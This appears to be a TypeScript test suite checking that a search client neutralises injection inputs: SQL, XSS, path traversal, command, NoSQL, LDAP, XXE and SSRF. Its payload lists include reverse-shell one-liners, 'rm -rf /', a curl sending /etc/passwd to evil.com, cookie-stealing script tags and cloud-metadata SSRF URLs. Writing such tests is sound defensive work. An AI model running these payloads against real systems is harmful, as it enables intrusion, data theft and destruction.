import { describe, it, expect } from 'bun:test';
import { z } from 'zod';
import { TestExaClient } from '../utils/test-client';

describe('Input Validation Security Tests', () => {
  // TestExaClient is already imported

  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "'; COPY users TO stdout WITH CSV HEADER; --",
        "'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; --",
        "1' UNION SELECT * FROM users--",
        "1' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--",
        "'; ALTER TABLE users ADD COLUMN test VARCHAR(255); --",
        "'; UPDATE users SET password='hacked' WHERE id=1; --",
        "'; INSERT INTO users (username,password) VALUES ('hacker','pass'); --",
        "'; CREATE TABLE hacked (data TEXT); --",
        "'; TRUNCATE TABLE users; --",
      ];

      const client = new TestExaClient('test-key');

      for (const payload of sqlInjectionPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          // If successful, ensure no SQL commands in output
          if (result.data) {
            const output = JSON.stringify(result.data);
            expect(output).not.toMatch(/DROP\s+TABLE/i);
            expect(output).not.toMatch(/DELETE\s+FROM/i);
            expect(output).not.toMatch(/INSERT\s+INTO/i);
            expect(output).not.toMatch(/UPDATE\s+.*\s+SET/i);
            expect(output).not.toMatch(/CREATE\s+TABLE/i);
            expect(output).not.toMatch(/ALTER\s+TABLE/i);
            expect(output).not.toMatch(/TRUNCATE\s+TABLE/i);
            expect(output).not.toMatch(/EXEC\s+xp_cmdshell/i);
            expect(output).not.toMatch(/COPY\s+.*\s+TO/i);
            expect(output).not.toMatch(/LOAD\s+DATA\s+INFILE/i);
            expect(output).not.toMatch(/UNION\s+SELECT/i);
          }
        } catch (error) {
          // It's acceptable to reject the input
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize XSS attempts', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<script>document.location="http://evil.com"</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '<script src="http://evil.com/malicious.js"></script>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>',
        '<div style="background:url(javascript:alert(1))">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<form><button formaction=javascript:alert(1)>X</button></form>',
        '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
        '<script>new Image().src="http://evil.com/steal?data="+document.cookie</script>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<applet code="javascript:alert(1)">',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of xssPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Check for dangerous HTML/JS patterns
            expect(output).not.toContain('<script>');
            expect(output).not.toContain('javascript:');
            expect(output).not.toContain('data:text/html');
            expect(output).not.toContain('onerror=');
            expect(output).not.toContain('onload=');
            expect(output).not.toContain('onfocus=');
            expect(output).not.toContain('ontoggle=');
            expect(output).not.toContain('onstart=');
            expect(output).not.toContain('formaction=');
            expect(output).not.toContain('<iframe>');
            expect(output).not.toContain('<object>');
            expect(output).not.toContain('<embed>');
            expect(output).not.toContain('<applet>');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
        '..%252f..%252f..%252fetc%252fpasswd', // Double URL encoded
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
        '/var/www/../../etc/passwd',
        '/etc/passwd%00',
        '../etc/passwd%00.jpg',
        'file:///etc/passwd',
        '/etc/shadow',
        '/proc/version',
        '/proc/self/environ',
        '/proc/meminfo',
        '/proc/cpuinfo',
        '/proc/net/tcp',
        '/proc/sys/kernel/version',
        'C:\\windows\\system32\\config\\sam',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\boot.ini',
        '../apache/logs/access.log',
        '../mysql/data/mysql/user.MYD',
        '../../etc/passwd',
        '../../../etc/shadow',
        '../../../../../../../../etc/passwd',
        '/etc/hosts',
        '/etc/resolv.conf',
        '/etc/issue',
        '/etc/motd',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of pathTraversalPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain file system paths
            expect(output).not.toContain('/etc/passwd');
            expect(output).not.toContain('/etc/shadow');
            expect(output).not.toContain('root:x:0:0');
            expect(output).not.toContain('system32');
            expect(output).not.toContain('C:\\windows');
            expect(output).not.toContain('/proc/');
            expect(output).not.toContain('/var/www/');
            expect(output).not.toContain('apache/logs');
            expect(output).not.toContain('mysql/data');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection attempts', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& echo "Command injection"',
        '`whoami`',
        '$(whoami)',
        '; rm -rf /',
        '| curl http://evil.com/steal?data=$(cat /etc/passwd)',
        '; ping -c 10 127.0.0.1',
        '& wget http://malicious.com/malware.sh',
        '`id`',
        '$(id)',
        '; nc -e /bin/sh 192.168.1.100 4444',
        '| bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',
        '; python -c "import os; os.system(\'whoami\')"',
        '& perl -e "system(\'whoami\')"',
        '`ruby -e "system(\'whoami\')"',
        '$(php -r "system(\'whoami\');")',
        '; /bin/sh -c "whoami"',
        '| powershell -Command "Get-Process"',
        '& cmd /c "dir"',
        '; /usr/bin/env python -c "import os; os.system(\'id\')"',
        '`/usr/bin/whoami`',
        '$(/usr/bin/id)',
        '; cat /proc/version',
        '| dmesg',
        '& lsof -i',
        '`netstat -an`',
        '$(ps aux)',
        '; uptime',
        '| df -h',
        '& free -m',
        '`uname -a`',
        '$(env)',
        '; printenv',
        '| set',
        '& alias',
        '`history`',
        '$(cat ~/.bash_history)',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of commandInjectionPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain command execution results
            expect(output).not.toMatch(/root:x:0:0/); // /etc/passwd content
            expect(output).not.toMatch(/uid=\d+/); // id command output
            expect(output).not.toMatch(/whoami/);
            expect(output).not.toMatch(/Linux.*\d+\.\d+\.\d+/); // uname output
            expect(output).not.toMatch(/total\s+\d+/); // ls output
            expect(output).not.toMatch(/drwxr-xr-x/); // ls permissions
            expect(output).not.toMatch(/tcp.*LISTEN/); // netstat output
            expect(output).not.toMatch(/PID\s+USER/); // ps output
            expect(output).not.toMatch(/MemTotal:/); // free output
            expect(output).not.toMatch(/Filesystem.*Size/); // df output
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection attempts', async () => {
      const nosqlInjectionPayloads = [
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$in":["admin","test"]}',
        '{"$where":"this.username == \'admin\'"}',
        '{"$regex":".*"}',
        '{"$exists":true}',
        '{"$elemMatch":{"$gt":0}}',
        '{"$all":["admin","user"]}',
        '{"$size":0}',
        '{"$type":"string"}',
        "'; return db.users.find();'",
        "'; db.users.insert({username:'hacked'}); return null; //",
        "'; db.users.remove(); return null; //",
        "'; db.users.update({},{$set:{password:'hacked'}}); return null; //",
        '{"username":{"$ne":""},"password":{"$ne":""}}',
        '{"username":{"$regex":"^admin"},"password":{"$ne":""}}',
        '{"$or":[{"username":"admin"},{"password":""}]}',
        '{"$where":"this.password.match(/.*/)"}',
        '{"$expr":{"$gt":["$password",""]}}',
        '{"$jsonSchema":{"required":["username","password"]}}',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of nosqlInjectionPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain NoSQL operators in output
            expect(output).not.toContain('$gt');
            expect(output).not.toContain('$ne');
            expect(output).not.toContain('$in');
            expect(output).not.toContain('$where');
            expect(output).not.toContain('$regex');
            expect(output).not.toContain('$exists');
            expect(output).not.toContain('$elemMatch');
            expect(output).not.toContain('$all');
            expect(output).not.toContain('$size');
            expect(output).not.toContain('$type');
            expect(output).not.toContain('$or');
            expect(output).not.toContain('$expr');
            expect(output).not.toContain('$jsonSchema');

            // Should not contain database commands
            expect(output).not.toContain('db.users.find');
            expect(output).not.toContain('db.users.insert');
            expect(output).not.toContain('db.users.remove');
            expect(output).not.toContain('db.users.update');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection attempts', async () => {
      const ldapInjectionPayloads = [
        '*)(&',
        '*)(|(',
        '*)(password=*)',
        '*)(uid=*',
        '*)(cn=*',
        '*))(|(uid=*))',
        '*)(|(objectClass=*)',
        '*)(|(cn=*))',
        '*))(&(objectClass=*)',
        '*)(uid=*',
        '*)(|(objectClass=user)',
        '*)(|(cn=admin))',
        '*)(|(sn=admin))',
        '*)(|(mail=admin*))',
        '*)(|(telephoneNumber=*))',
        'admin)(&(password=*))',
        'admin)(&(objectClass=*))',
        'admin)((|(objectClass=*))',
        '*)(uid=admin',
        '*)(cn=admin',
        '*)(sn=admin',
        '*)(mail=admin*',
        '*))%00',
        'admin*))%00',
        '*\\28',
        '*\\29',
        '*\\2a',
        '*\\5c',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of ldapInjectionPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain LDAP special characters or operators
            expect(output).not.toContain('*&)');
            expect(output).not.toContain('*)(');
            expect(output).not.toContain('password=*');
            expect(output).not.toContain('uid=*');
            expect(output).not.toContain('cn=*');
            expect(output).not.toContain('objectClass=*');
            expect(output).not.toContain('sn=*');
            expect(output).not.toContain('mail=*');
            expect(output).not.toContain('telephoneNumber=*');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('XXE Prevention', () => {
    it('should prevent XML External Entity attacks', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><xml>&file;</xml>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious.xml" >]><xml>&xxe;</xml>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">%file;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "jar://file:///etc/passwd">%xxe;]><foo>&xxe;</foo>',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of xxePayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain XML DOCTYPE declarations or entity references
            expect(output).not.toContain('<!DOCTYPE');
            expect(output).not.toContain('<!ENTITY');
            expect(output).not.toContain('SYSTEM');
            expect(output).not.toContain('file://');
            expect(output).not.toContain('http://evil.com');
            expect(output).not.toContain('php://filter');
            expect(output).not.toContain('expect://');
            expect(output).not.toContain('jar://');

            // Should not contain file contents
            expect(output).not.toContain('root:x:0:0');
            expect(output).not.toContain('127.0.0.1');
            expect(output).not.toContain('localhost');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('SSRF Prevention', () => {
    it('should prevent Server-Side Request Forgery attempts', async () => {
      const ssrfPayloads = [
        'http://localhost/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://metadata.google.internal/', // GCP metadata
        'http://169.254.169.254/latest/api/token',
        'file:///etc/passwd',
        'ftp://evil.com/files',
        'dict://127.0.0.1:6379/info',
        'gopher://127.0.0.1:80/_GET%20%2f%20HTTP%2f1.1%0d%0aHost%3a%20localhost%0d%0a%0d%0a',
        'http://0.0.0.0:8080/admin',
        'http://10.0.0.1/internal',
        'http://192.168.1.1/router',
        'http://172.16.0.1/internal-api',
        'http://[::1]/admin',
        'http://localhost:3306',
        'http://127.0.0.1:6379',
        'http://127.0.0.1:5432',
        'http://127.0.0.1:27017',
        'http://127.0.0.1:11211',
        'http://127.0.0.1:9200',
        'http://localhost:9000',
        'http://0.0.0.0:22',
      ];

      const client = new TestExaClient('test-key');

      for (const payload of ssrfPayloads) {
        try {
          const result = await client.executeTask({
            query: payload,
            type: 'search'
          });

          if (result.data) {
            const output = JSON.stringify(result.data);

            // Should not contain internal network references
            expect(output).not.toContain('localhost');
            expect(output).not.toContain('127.0.0.1');
            expect(output).not.toContain('169.254.169.254');
            expect(output).not.toContain('metadata.google.internal');
            expect(output).not.toContain('0.0.0.0');
            expect(output).not.toContain('[::1]');
            expect(output).not.toContain('file://');
            expect(output).not.toContain('ftp://');
            expect(output).not.toContain('dict://');
            expect(output).not.toContain('gopher://');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });
});